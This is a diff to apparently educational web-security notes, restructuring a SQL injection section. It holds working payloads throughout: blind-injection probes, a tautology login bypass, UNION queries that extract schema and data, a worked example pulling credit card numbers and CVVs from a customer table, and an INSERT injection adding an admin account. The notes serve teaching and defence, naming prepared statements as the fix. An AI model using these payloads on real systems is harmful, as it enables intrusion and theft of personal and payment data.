@@ -138,43 +138,41 @@
   *Core idea*: User input treated as code, not data
 
   #subinline("SQL Injection")
+  *Detection:*
   - *Testing*: Insert `'` → SQL error (HTTP 500, different response) = vulnerable
   - *Blind SQLi* (no visible errors):
     - *Time-based*: ```sql SLEEP(5)``` causes delay if vulnerable
-    - *Boolean-based*: Different response for true/false conditions (e.g., ```sql ' AND 1=1--``` vs ```sql ' AND 1=2--```)
-    - *LIKE extraction*: Character-by-character: ```sql ' AND (SELECT col FROM t) LIKE 'a%'--``` → try each char until response changes
-  - *Tautology (always-true)*: ```sql ' OR ''='``` makes WHERE always TRUE:
-    - ```sql WHERE (userid=? AND password='') OR ''=''``` → first part fails, but ```sql ''=''``` is TRUE
-    - If app only reads first row: use `LIMIT offset,1` to select which row (e.g., ```sql ' OR 1=1 LIMIT 4,1#``` → 5th row)
+    - *Boolean-based*: Different response for true/false (```sql ' AND 1=1--``` vs ```sql ' AND 1=2--```)
+
+  *Exploitation:*
+  - *Tautology*: ```sql ' OR ''='``` makes WHERE always TRUE → bypass login
+    - If app reads first row only: `LIMIT offset,1` to select row (```sql ' OR 1=1 LIMIT 4,1#``` → 5th row)
   - *UNION attack*:
-    1. *Find column count*: Try ```sql ' UNION SELECT NULL--```, ```sql ' UNION SELECT NULL,NULL--```, etc. until no error
-    2. *Extract data*: ```sql ' UNION SELECT col1,col2,... FROM table--``` (column count must match original query)
-  - *Schema discovery* (find tables/columns first):
+    1. *Find column count*: ```sql ' UNION SELECT NULL--```, ```sql ' UNION SELECT NULL,NULL--```, etc. until no error
+    2. *Extract data*: ```sql ' UNION SELECT col1,col2,... FROM table--``` (count must match)
+  - *Schema discovery*:
     - Tables: ```sql UNION SELECT TABLE_NAME,NULL,... FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--```
     - Columns: ```sql UNION SELECT COLUMN_NAME,NULL,... FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='target'--```
-  - *UNION attack example*:
+  - *UNION example*:
     ```java
     // Vulnerable: string concat
     String q = "SELECT HotelID, Desc, City, Price FROM Hotel " +
                "WHERE City LIKE '%" + city + "%' AND Price <= " + price;
     ```
-    Goal: Extract `CCNumber`, `CVV`, `FullName` from `Customer` table (4 columns needed to match)
+    Goal: Extract `CCNumber`, `CVV`, `FullName` from `Customer` (4 columns needed)
     - *city*: `' UNION SELECT 1, CCNumber, FullName, CVV FROM Customer--`
-    - *price*: `100` (anything valid, won't be reached)
-    - Result query: `...LIKE '%' UNION SELECT 1, CCNumber, FullName, CVV FROM Customer--%' AND...`
-    - The `--` comments out rest → returns all customer data instead of hotels
-  - *MySQL functions*:
+    - *price*: `100` (won't be reached)
+    - Result: `...LIKE '%' UNION SELECT 1, CCNumber, FullName, CVV FROM Customer--%' AND...`
+
+  *MySQL-specific:*
+  - *Comments*: ```sql --``` (+ space) or ```sql #``` to cut off rest of query
+  - *Functions*:
     - `LIMIT offset,count` → pagination (`LIMIT 4,1` = 5th row, 0-indexed)
-    - `GROUP_CONCAT(col)` → merge all rows into single string (useful for extracting multiple values)
-    - `CONCAT_WS(':',a,b,c)` → join columns with separator → `a:b:c`
-    - `DATABASE()` → current database name (for INFORMATION_SCHEMA queries)
-  - *Comments*: Cut off rest of query (e.g., ```sql admin'--``` ignores ```sql AND pass='...'```)
-    - MySQL: ```sql --``` + space after, or ```sql #```
-    - Others: ```sql --```
-  - *Multiple queries*: `;` separator only works if server uses `executeBatch()`
-  - *INSERT injection*: ```sql userpass'), ('admin', 'Superuser', 'adminpass')--```
-  - *Response fingerprinting* (Blind SQLi): Different error for "valid user, wrong pass" vs "invalid user" → oracle for user enumeration
-  - *Counter*: Prepared statements. Escaping (`'` → `\'`) is weaker - encoding issues, incomplete.
+    - `GROUP_CONCAT(col)` → merge all rows into single string
+    - `CONCAT_WS(':',a,b)` → join columns with separator
+    - `DATABASE()` → current database name
+
+  *Counter*: Prepared statements (see prevention section). Escaping is weaker.
 
   #subinline("OS Command Injection")
   - *Cause*: App executes OS commands with user input (Java `Runtime.exec()`, PHP `system()`)
